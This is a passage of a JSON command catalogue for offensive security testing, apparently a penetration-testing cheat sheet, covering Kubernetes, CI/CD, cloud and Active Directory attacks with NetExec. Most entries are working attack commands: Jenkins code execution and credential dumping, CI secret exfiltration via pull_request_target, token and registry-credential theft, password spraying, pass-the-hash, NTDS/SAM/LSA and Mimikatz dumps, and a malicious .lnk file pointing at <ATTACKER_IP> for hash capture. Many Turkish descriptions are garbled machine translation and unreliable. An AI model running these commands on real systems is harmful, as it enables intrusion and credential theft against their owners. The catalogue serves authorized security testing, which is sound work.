              "tool"
            ],
            "desc": "List all ingress rules for endpoint discovery",
            "desc_tr": "Listele: tüm ingress rules for endpoint discovery"
          },
          {
            "title": "Get Network Policies",
            "cmd": "kubectl get networkpolicies --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List network policies to find unrestricted namespaces",
            "desc_tr": "Listele: network policies find unrestricted namespaces'e"
          },
          {
            "title": "Get Persistent Volumes",
            "cmd": "kubectl get pv,pvc --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List persistent volumes and claims for data access",
            "desc_tr": "Listele: persistent volumes and claims for data access"
          },
          {
            "title": "Get DaemonSets",
            "cmd": "kubectl get daemonsets --all-namespaces",
            "tags": [
              "tool"
            ],
            "desc": "List DaemonSets running on all nodes",
            "desc_tr": "Listele: DaemonSets running tüm nodes üzerinde"
          },
          {
            "title": "Get Pod Environment Variables",
            "cmd": "kubectl exec <POD_NAME> -n <NAMESPACE> -- env | sort",
            "tags": [
              "essential"
            ],
            "desc": "Extract environment variables from a running pod",
            "desc_tr": "Çıkart: ortam değişkenleri a running pod üzerinden"
          },
          {
            "title": "Get Pod Logs",
            "cmd": "kubectl logs <POD_NAME> -n <NAMESPACE> --all-containers",
            "tags": [
              "tool"
            ],
            "desc": "View pod logs for sensitive information leakage",
            "desc_tr": "View pod logs for sensitive informatileakage üzerinde"
          },
          {
            "title": "Kubectl Proxy for API Access",
            "cmd": "kubectl proxy --port=8001 &",
            "tags": [
              "tool"
            ],
            "desc": "Start local proxy to Kubernetes API for easy access",
            "desc_tr": "Başlat: yerel vekil sunucu (proxy) Kubernetes API for easy access'e"
          },
          {
            "title": "List RBAC Roles",
            "cmd": "kubectl get roles,clusterroles --all-namespaces -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List all RBAC roles to identify overly permissive roles",
            "desc_tr": "Listele: tüm RBAC roles identify overly permissive roles'e"
          },
          {
            "title": "List RBAC Bindings",
            "cmd": "kubectl get rolebindings,clusterrolebindings --all-namespaces -o wide",
            "tags": [
              "tool"
            ],
            "desc": "List role bindings to find privilege assignments",
            "desc_tr": "Listele: role bindings find privilege assignments'e"
          },
          {
            "title": "Kube-Hunter Remote Scan",
            "cmd": "kube-hunter --remote <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster for security issues remotely",
            "desc_tr": "Tara: ma Kubernetes cluster for security issues remotely"
          },
          {
            "title": "Kube-Hunter Internal Scan",
            "cmd": "kube-hunter --internal",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster from within a pod",
            "desc_tr": "Tara: ma Kubernetes cluster witha pod üzerinden içinde"
          },
          {
            "title": "Kube-Bench CIS Benchmark",
            "cmd": "kube-bench run --targets master,node",
            "tags": [
              "tool"
            ],
            "desc": "Run CIS Kubernetes Benchmark checks",
            "desc_tr": "Çalıştır: CIS Kubernetes Benchmark checks"
          },
          {
            "title": "Trivy Image Scan",
            "cmd": "trivy image <IMAGE_NAME>:<TAG>",
            "tags": [
              "essential"
            ],
            "desc": "Scan a container image for vulnerabilities",
            "desc_tr": "Tara: ma a container image for zafiyet(ler)"
          },
          {
            "title": "Trivy Filesystem Scan",
            "cmd": "trivy fs /path/to/project",
            "tags": [
              "tool"
            ],
            "desc": "Scan filesystem for vulnerabilities and misconfigurations",
            "desc_tr": "Tara: ma filesystem for zafiyet(ler) and misconfigurations"
          },
          {
            "title": "Trivy K8s Cluster Scan",
            "cmd": "trivy k8s --report summary cluster",
            "tags": [
              "tool"
            ],
            "desc": "Scan Kubernetes cluster for security issues",
            "desc_tr": "Tara: ma Kubernetes cluster for security issues"
          },
          {
            "title": "Docker Bench Security",
            "cmd": "docker run -it --net host --pid host --userns host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc --label docker_bench_security docker/docker-bench-security",
            "tags": [
              "tool"
            ],
            "desc": "Run Docker CIS Benchmark security audit",
            "desc_tr": "Çalıştır: Docker CIS Benchmark security audit"
          },
          {
            "title": "Falco Runtime Security",
            "cmd": "falco -r /etc/falco/falco_rules.yaml",
            "tags": [
              "advanced"
            ],
            "desc": "Runtime security monitoring for containers",
            "desc_tr": "Runtime security monitoring for containers"
          },
          {
            "title": "Kubectl Token from Pod",
            "cmds": [
              "# From within a pod:",
              "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
              "APISERVER=https://kubernetes.default.svc",
              "curl -sk $APISERVER/api/v1/namespaces -H \"Authorization: Bearer $TOKEN\""
            ],
            "tags": [
              "essential"
            ],
            "desc": "Use service account token to query Kubernetes API from within a pod",
            "desc_tr": "Use service account token query Kubernetes API witha pod üzerinden'e içinde"
          }
        ],
        "name_tr": "Kubernetes Reconnaissance"
      },
      {
        "name": "CI/CD Pipeline Attacks",
        "commands": [
          {
            "title": "Jenkins Script Console RCE",
            "cmd": "# Navigate to http://<TARGET_IP>:8080/script\n# Execute: println 'whoami'.execute().text",
            "tags": [
              "essential"
            ],
            "desc": "Execute system commands via Jenkins Groovy Script Console",
            "desc_tr": "Çalıştır: system commands Jenkins Groovy Script Console üzerinden"
          },
          {
            "title": "Jenkins Credential Dump (Groovy)",
            "cmd": "# In Script Console:\ndef creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials.class, Jenkins.instance, null, null); creds.each { println it.username + ':' + it.password }",
            "tags": [
              "essential"
            ],
            "desc": "Dump all stored credentials from Jenkins via Groovy",
            "desc_tr": "Dökümle: tüm stored kimlik bilgileri Jenkins Groovy üzerinden üzerinden"
          },
          {
            "title": "Jenkins Decrypt Secret",
            "cmd": "# In Script Console:\nprintln(hudson.util.Secret.decrypt('{<ENCRYPTED_SECRET>}'))",
            "tags": [
              "essential"
            ],
            "desc": "Decrypt a Jenkins encrypted secret value",
            "desc_tr": "Şifreyi çöz: a Jenkins encrypted secret value"
          },
          {
            "title": "Jenkins Remote Code Execution",
            "cmd": "curl -X POST 'http://<TARGET_IP>:8080/scriptText' --data-urlencode 'script=println \"whoami\".execute().text' --user '<USER>:<PASS>'",
            "tags": [
              "essential"
            ],
            "desc": "Execute Groovy script via Jenkins API remotely",
            "desc_tr": "Çalıştır: Groovy script Jenkins API remotely üzerinden"
          },
          {
            "title": "GitLab CI Token from Runner",
            "cmds": [
              "# On a GitLab Runner, check for:",
              "cat /etc/gitlab-runner/config.toml",
              "# Look for 'token' field in [[runners]] section"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Extract GitLab CI runner registration tokens",
            "desc_tr": "Çıkart: GitLab CI runner registratitokens üzerinde"
          },
          {
            "title": "GitLab CI Variables",
            "cmd": "curl --header 'PRIVATE-TOKEN: <GITLAB_TOKEN>' 'https://<GITLAB_URL>/api/v4/projects/<PROJECT_ID>/variables'",
            "tags": [
              "essential"
            ],
            "desc": "List CI/CD variables (secrets) for a GitLab project",
            "desc_tr": "Listele: CI/CD variables (secrets) for a GitLab project"
          },
          {
            "title": "GitHub Actions Secrets Exposure",
            "cmds": [
              "# Check workflow files for secret references:",
              "# ${{ secrets.SECRET_NAME }}",
              "# Look for secrets leaked in logs or artifacts",
              "# Check .github/workflows/ for hardcoded values"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Identify GitHub Actions secret exposure vectors",
            "desc_tr": "Tespit et: GitHub Actions secret exposure vectors"
          },
          {
            "title": "GitHub Actions — Inject in PR",
            "cmds": [
              "# If workflows trigger on pull_request_target:",
              "# Fork repo, modify workflow to echo secrets",
              "# Submit PR to trigger workflow on target repo"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Exploit pull_request_target for secret exfiltration",
            "note": "Only in controlled/authorized testing scenarios",
            "desc_tr": "İstismar et: r pull_request_target for secret exfiltration"
          },
          {
            "title": "Terraform State Secrets",
            "cmds": [
              "# Check for remote state files:",
              "cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null or .secret_key != null)'",
              "# S3 state: aws s3 cp s3://<BUCKET>/terraform.tfstate ."
            ],
            "tags": [
              "essential"
            ],
            "desc": "Extract secrets from Terraform state files",
            "desc_tr": "Çıkart: secrets Terraform state files üzerinden"
          },
          {
            "title": "Terraform State from S3",
            "cmd": "aws s3 ls s3://<BUCKET> --recursive | grep tfstate && aws s3 cp s3://<BUCKET>/terraform.tfstate /tmp/",
            "tags": [
              "tool"
            ],
            "desc": "Download Terraform state file from S3 bucket",
            "desc_tr": "İndir: Terraform state file S3 bucket üzerinden"
          },
          {
            "title": "ArgoCD Token Extraction",
            "cmd": "kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d",
            "tags": [
              "tool"
            ],
            "desc": "Extract ArgoCD initial admin password from Kubernetes",
            "desc_tr": "Çıkart: ArgoCD initial admpassword Kubernetes üzerinden içinde"
          },
          {
            "title": "Helm Release Secrets",
            "cmd": "kubectl get secrets -l owner=helm --all-namespaces -o json | jq '.items[].data' | jq -r 'to_entries[] | .value' | base64 -d | gunzip 2>/dev/null",
            "tags": [
              "advanced"
            ],
            "desc": "Decode Helm release secrets which may contain sensitive values",
            "desc_tr": "Çöz: zme Helm release secrets which may contasensitive values içinde"
          },
          {
            "title": "CI/CD Environment Variables",
            "cmds": [
              "env | sort",
              "printenv",
              "cat /proc/self/environ | tr '\\0' '\\n'"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Dump all environment variables in CI/CD pipeline context",
            "desc_tr": "Dökümle: tüm ortam değişkenleri CI/CD pipeline context içinde"
          },
          {
            "title": "Docker Registry Credentials",
            "cmds": [
              "cat ~/.docker/config.json",
              "cat /root/.docker/config.json",
              "# Base64 decode the 'auth' field for credentials"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Extract Docker registry credentials from config files",
            "desc_tr": "Çıkart: Docker registry kimlik bilgileri yapılandırma dosyası üzerinden"
          }
        ],
        "name_tr": "CI/CD Pipeline Attacks"
      },
      {
        "name": "Azure & GCP Basics",
        "commands": [
          {
            "title": "Azure Login",
            "desc": "Authenticate to Azure",
            "cmd": "az login",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama Azure'e"
          },
          {
            "title": "Azure List Users",
            "desc": "Enumerate Azure AD users",
            "cmd": "az ad user list --query '[].{Name:displayName,UPN:userPrincipalName}' -o table",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: Azure AD users"
          },
          {
            "title": "Azure List VMs",
            "desc": "Enumerate VMs",
            "cmd": "az vm list -o table",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: VMs"
          },
          {
            "title": "Azure Key Vaults",
            "desc": "Enumerate key vaults",
            "cmd": "az keyvault list -o table",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: key vaults"
          },
          {
            "title": "GCloud Login",
            "desc": "Auth to GCP",
            "cmd": "gcloud auth login",
            "tags": [
              "essential"
            ],
            "desc_tr": "Auth GCP'e"
          },
          {
            "title": "GCloud Projects",
            "desc": "List projects",
            "cmd": "gcloud projects list",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: projects"
          },
          {
            "title": "GCloud Instances",
            "desc": "List compute VMs",
            "cmd": "gcloud compute instances list",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: compute VMs"
          },
          {
            "title": "GCloud Secrets",
            "desc": "List secrets",
            "cmds": [
              "gcloud secrets list",
              "gcloud secrets versions access latest --secret=<SECRET>"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: secrets"
          },
          {
            "title": "ROADtools Azure AD",
            "desc": "Dump Azure AD",
            "cmds": [
              "roadrecon auth -u <USER>@<DOMAIN> -p '<PASS>'",
              "roadrecon gather",
              "roadrecon gui"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: Azure AD"
          },
          {
            "title": "AzureHound",
            "desc": "BloodHound for Azure",
            "cmd": "azurehound -u <USER>@<DOMAIN> -p '<PASS>' list --tenant <TENANT_ID> -o azure.json",
            "tags": [
              "tool"
            ],
            "desc_tr": "BloodHound for Azure"
          }
        ],
        "name_tr": "Azure & GCP Basics"
      }
    ],
    "name_tr": "Konteyner ve Altyapı Testi",
    "description_tr": "Test Docker, Kubernetes, and CI/CD pipeline security"
  },
  {
    "id": "netexec",
    "name": "NetExec / CrackMapExec",
    "icon": "🕸️",
    "description": "NetExec (nxc) and CrackMapExec for Active Directory enumeration, lateral movement, and credential attacks.",
    "subcategories": [
      {
        "name": "SMB Enumeration",
        "commands": [
          {
            "title": "NXC SMB Host Discovery",
            "desc": "Discover live hosts and OS info via SMB",
            "cmd": "nxc smb <SUBNET>/24",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Keşfet: live hosts and OS info SMB üzerinden"
          },
          {
            "title": "NXC SMB Null Session",
            "desc": "Test null session authentication",
            "cmd": "nxc smb <TARGET_IP> -u '' -p ''",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: boş oturum kimlik doğrulama"
          },
          {
            "title": "NXC SMB Guest Session",
            "desc": "Test guest authentication",
            "cmd": "nxc smb <TARGET_IP> -u 'guest' -p ''",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: guest kimlik doğrulama"
          },
          {
            "title": "NXC SMB Enumerate Shares",
            "desc": "List all SMB shares",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm SMB shares"
          },
          {
            "title": "NXC SMB Enumerate Users",
            "desc": "List domain users via RID brute force",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --users",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı kullanıcıları RID kaba kuvvet saldırısı üzerinden"
          },
          {
            "title": "NXC SMB Enumerate Groups",
            "desc": "List domain groups",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --groups",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: etki alanı grupları"
          },
          {
            "title": "NXC SMB Enumerate Logged Users",
            "desc": "Show currently logged in users",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --loggedon-users",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: currently logged users içinde"
          },
          {
            "title": "NXC SMB Password Policy",
            "desc": "Get domain password policy",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --pass-pol",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: domaparola politikası içinde"
          },
          {
            "title": "NXC SMB RID Brute",
            "desc": "Enumerate users via RID cycling (no creds needed)",
            "cmd": "nxc smb <TARGET_IP> -u '' -p '' --rid-brute",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users RID cycling (no creds needed) üzerinden"
          },
          {
            "title": "NXC SMB Enumerate Sessions",
            "desc": "Show active SMB sessions",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sessions",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: active SMB sessions"
          },
          {
            "title": "NXC SMB Disks",
            "desc": "List local disks",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --disks",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: yerel disks"
          },
          {
            "title": "NXC SMB Local Groups",
            "desc": "Enumerate local groups",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-groups",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: yerel groups"
          },
          {
            "title": "NXC SMB Interfaces",
            "desc": "List network interfaces",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --interfaces",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: ağ arayüzü"
          }
        ],
        "name_tr": "SMB Enumeration"
      },
      {
        "name": "SMB Authentication & Exec",
        "commands": [
          {
            "title": "NXC SMB Password Spray",
            "desc": "Password spray against multiple hosts",
            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success",
            "tags": [
              "essential"
            ],
            "desc_tr": "parola püskürtme multiple hosts'e karşı"
          },
          {
            "title": "NXC SMB User List Spray",
            "desc": "Spray a password against a user list",
            "cmd": "nxc smb <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success",
            "tags": [
              "essential"
            ],
            "desc_tr": "Püskürt: a password a user list'e karşı"
          },
          {
            "title": "NXC SMB Pass the Hash",
            "desc": "Authenticate using NTLM hash",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama NTLM hash kullanarak"
          },
          {
            "title": "NXC SMB Execute Command",
            "desc": "Run command via SMBExec",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami /all'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: command SMBExec üzerinden"
          },
          {
            "title": "NXC SMB PowerShell Exec",
            "desc": "Run PowerShell command via SMB",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -X 'Get-Process'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: PowerShell command SMB üzerinden"
          },
          {
            "title": "NXC SMB WMI Exec",
            "desc": "Execute command via WMI",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method wmiexec",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: command WMI üzerinden"
          },
          {
            "title": "NXC SMB AT Exec",
            "desc": "Execute command via scheduled task",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami' --exec-method atexec",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: command zamanlanmış görevler üzerinden"
          },
          {
            "title": "NXC SMB Kerberos Auth",
            "desc": "Authenticate using Kerberos ticket",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -k",
            "tags": [
              "tool"
            ],
            "desc_tr": "kimlik doğrulama Kerberos ticket kullanarak"
          },
          {
            "title": "NXC Local Auth",
            "desc": "Use local account instead of domain",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --local-auth",
            "tags": [
              "essential"
            ],
            "desc_tr": "Use yerel account instead of domain"
          },
          {
            "title": "NXC SMB Check Admin",
            "desc": "Check if credentials have admin access",
            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --local-auth",
            "tags": [
              "essential"
            ],
            "note": "Pwn3d! = admin access confirmed",
            "desc_tr": "Kontrol et: if kimlik bilgileri have admaccess içinde"
          },
          {
            "title": "NXC SMB Brute Force Single User",
            "desc": "Brute force passwords for a single user",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p passwords.txt --continue-on-success",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tek kullanıcı için parola brute force"
          },
          {
            "title": "NXC SMB Brute Force User + Pass Lists",
            "desc": "Try all user/password combinations (brute force mode)",
            "cmd": "nxc smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success",
            "tags": [
              "essential"
            ],
            "note": "Without --no-bruteforce: tries every user with every password (N*M attempts)",
            "desc_tr": "Tüm kullanıcı/parola kombinasyonlarını dene (brute force modu)"
          },
          {
            "title": "NXC SMB Spray No Brute",
            "desc": "Spray without brute force — match user1:pass1, user2:pass2 (1:1 mapping)",
            "cmd": "nxc smb <TARGET_IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
            "tags": [
              "essential"
            ],
            "note": "--no-bruteforce pairs each user with its corresponding password line by line",
            "desc_tr": "Brute force olmadan spray — user1:pass1, user2:pass2 (1:1 eşleşme)"
          },
          {
            "title": "NXC SMB Hash Spray",
            "desc": "Spray NTLM hash against multiple users",
            "cmd": "nxc smb <TARGET_IP> -u users.txt -H <NTLM_HASH> --continue-on-success",
            "tags": [
              "essential"
            ],
            "desc_tr": "NTLM hash'i birden fazla kullanıcıya spray et"
          },
          {
            "title": "NXC SMB Hash List Spray",
            "desc": "Spray list of NTLM hashes against a user",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -H hashes.txt --continue-on-success",
            "tags": [
              "tool"
            ],
            "desc_tr": "NTLM hash listesini tek kullanıcıya spray et"
          },
          {
            "title": "NXC SMB Subnet Spray",
            "desc": "Password spray across entire subnet",
            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success",
            "tags": [
              "essential"
            ],
            "desc_tr": "Tüm subnet'e password spray"
          },
          {
            "title": "NXC SMB Spray from Targets File",
            "desc": "Spray credentials against hosts from file",
            "cmd": "nxc smb targets.txt -u <USER> -p '<PASS>' --continue-on-success",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dosyadaki hedeflere credential spray"
          },
          {
            "title": "NXC SMB Check Admin Subnet",
            "desc": "Find all hosts where credentials have local admin",
            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success",
            "tags": [
              "essential"
            ],
            "note": "Look for (Pwn3d!) in output to identify admin access",
            "desc_tr": "Credential'ların local admin olduğu tüm host'ları bul"
          },
          {
            "title": "NXC SMB Signing Check",
            "desc": "Check SMB signing status across network (for relay attacks)",
            "cmd": "nxc smb <SUBNET>/24 --gen-relay-list relay_targets.txt",
            "tags": [
              "essential"
            ],
            "note": "Hosts without SMB signing are vulnerable to NTLM relay",
            "desc_tr": "Ağdaki SMB signing durumunu kontrol et (relay saldırıları için)"
          },
          {
            "title": "NXC SMB Enumerate Shares (Spider)",
            "desc": "Recursively spider all accessible shares for sensitive files",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus -o EXCLUDE_DIR=IPC$",
            "tags": [
              "essential"
            ],
            "note": "Output saved to /tmp/nxc_spider_plus/",
            "desc_tr": "Erişilebilir share'leri hassas dosyalar için tara"
          },
          {
            "title": "NXC SMB PtH Execute Command",
            "desc": "Execute command using Pass the Hash",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -x 'whoami /all'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Pass the Hash ile komut çalıştır"
          },
          {
            "title": "NXC SMB PtH PowerShell",
            "desc": "Run PowerShell command using Pass the Hash",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -X 'Get-Process'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Pass the Hash ile PowerShell komutu çalıştır"
          },
          {
            "title": "NXC SMB Domain Auth",
            "desc": "Authenticate with explicit domain specification",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Açık domain belirterek kimlik doğrulama"
          },
          {
            "title": "NXC SMB Kerberos with CCACHE",
            "desc": "Authenticate using Kerberos ccache ticket file",
            "cmd": "export KRB5CCNAME=<USER>.ccache && nxc smb <TARGET_IP> -u <USER> -k --use-kcache",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kerberos ccache ticket dosyası ile kimlik doğrulama"
          },
          {
            "title": "NXC SMB NTDS with Hash Auth",
            "desc": "Dump entire domain hashes using Pass the Hash",
            "cmd": "nxc smb <DC_IP> -u <USER> -H <NTLM_HASH> --ntds",
            "tags": [
              "essential"
            ],
            "desc_tr": "Pass the Hash ile tüm domain hash'lerini dökümle"
          },
          {
            "title": "NXC SMB DPAPI Module",
            "desc": "Extract DPAPI secrets (Chrome passwords, WiFi keys etc.)",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M dpapi",
            "tags": [
              "advanced"
            ],
            "desc_tr": "DPAPI gizli bilgilerini çıkar (Chrome parolaları, WiFi anahtarları vb.)"
          },
          {
            "title": "NXC SMB LAPS Reader",
            "desc": "Read LAPS passwords from Active Directory",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps",
            "tags": [
              "essential"
            ],
            "desc_tr": "Active Directory'den LAPS parolalarını oku"
          },
          {
            "title": "NXC SMB Enum AV",
            "desc": "Enumerate installed antivirus on target",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M enum_av",
            "tags": [
              "tool"
            ],
            "desc_tr": "Hedefte kurulu antivirüsü keşfet"
          },
          {
            "title": "NXC SMB Bloodhound Collection",
            "desc": "Collect BloodHound data via NetExec",
            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --bloodhound -ns <DC_IP> -c All",
            "tags": [
              "essential"
            ],
            "desc_tr": "NetExec ile BloodHound verisi topla"
          },
          {
            "title": "NXC SMB WebDAV Check",
            "desc": "Check if WebDAV is enabled on targets",
            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' -M webdav",
            "tags": [
              "tool"
            ],
            "desc_tr": "Hedeflerde WebDAV aktif mi kontrol et"
          },
          {
            "title": "NXC SMB slinky Module",
            "desc": "Create malicious shortcut (.lnk) on writable share for hash capture",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M slinky -o SERVER=<ATTACKER_IP> NAME=important",
            "tags": [
              "advanced"
            ],
            "note": "Combine with Responder to capture hashes",
            "desc_tr": "Yazılabilir share'de hash yakalama için kötü amaçlı shortcut (.lnk) oluştur"
          }
        ],
        "name_tr": "SMB Authentication & Exec"
      },
      {
        "name": "SMB Modules",
        "commands": [
          {
            "title": "NXC SAM Dump",
            "desc": "Dump SAM database (local hashes)",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --sam",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: SAM database (yerel hashes)"
          },
          {
            "title": "NXC LSA Dump",
            "desc": "Dump LSA secrets",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --lsa",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: LSA secrets"
          },
          {
            "title": "NXC NTDS Dump",
            "desc": "Dump NTDS.dit (domain hashes) via DCSync",
            "cmd": "nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: NTDS.dit (domahashes) DCSync üzerinden içinde"
          },
          {
            "title": "NXC Mimikatz Module",
            "desc": "Run Mimikatz logonpasswords",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M mimikatz",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: Mimikatz logonpasswords"
          },
          {
            "title": "NXC Lsassy Module",
            "desc": "Dump credentials with lsassy",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dökümle: kimlik bilgileri lsassy ile"
          },
          {
            "title": "NXC Spider Shares",
            "desc": "Spider SMB shares for interesting files",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus",
            "tags": [
              "essential"
            ],
            "desc_tr": "Spider SMB shares for ilginç files"
          },
          {
            "title": "NXC GPP Passwords",
            "desc": "Search for GPP stored passwords",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_password",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for GPP stored passwords"
          },
          {
            "title": "NXC GPP Auto-Login",
            "desc": "Find GPP autologin credentials",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M gpp_autologin",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: GPP autologkimlik bilgileri içinde"
          },
          {
            "title": "NXC Zerologon Check",
            "desc": "Check for Zerologon vulnerability",
            "cmd": "nxc smb <DC_IP> -u '' -p '' -M zerologon",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for Zerologzafiyet(ler) üzerinde"
          },
          {
            "title": "NXC PetitPotam Check",
            "desc": "Check for PetitPotam vulnerability",
            "cmd": "nxc smb <DC_IP> -u '' -p '' -M petitpotam",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for PetitPotam zafiyet(ler)"
          },
          {
            "title": "NXC MS17-010 Check",
            "desc": "Check for EternalBlue vulnerability",
            "cmd": "nxc smb <TARGET_IP> -u '' -p '' -M ms17-010",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: for EternalBlue zafiyet(ler)"
          },
          {
            "title": "NXC Printnightmare Check",
            "desc": "Check for PrintNightmare",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M printnightmare",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: for PrintNightmare"
          },
          {
            "title": "NXC Put File",
            "desc": "Upload file to target share",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --put-file /local/file.txt '\\\\<SHARE>\\file.txt'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yükle: file target share'e"
          },
          {
            "title": "NXC Get File",
            "desc": "Download file from target share",
            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --get-file '\\\\<SHARE>\\file.txt' /local/file.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "İndir: file target share üzerinden"
          }
        ],
        "name_tr": "SMB Modules"
      },
      {
        "name": "WinRM / LDAP / MSSQL",
        "commands": [
          {
            "title": "NXC WinRM Auth Check",
            "desc": "Test WinRM authentication",
            "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: WinRM kimlik doğrulama"
          },
          {
            "title": "NXC WinRM Execute",
            "desc": "Run command over WinRM",
            "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Çalıştır: command over WinRM"
          },
          {
            "title": "NXC WinRM Shell",
            "desc": "Get interactive shell via WinRM",
